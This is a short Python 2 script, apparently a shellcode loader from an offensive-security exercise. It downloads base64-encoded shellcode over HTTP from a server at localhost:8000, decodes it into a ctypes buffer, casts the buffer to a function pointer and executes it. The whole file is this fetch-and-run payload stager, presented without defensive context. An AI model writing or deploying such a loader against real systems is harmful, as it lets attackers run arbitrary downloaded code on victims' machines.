import urllib
import urllib2
import ctypes
import base64

url = "http://localhost:8000/shellcode.bin"
response = urllib2.urlopen(url)

# Decode shell code
shellcode = base64.b64decode(response.read())

# Create a buffer in memory
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

# Create function pointer to shellcode
shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

# Call shell code
shellcode_func()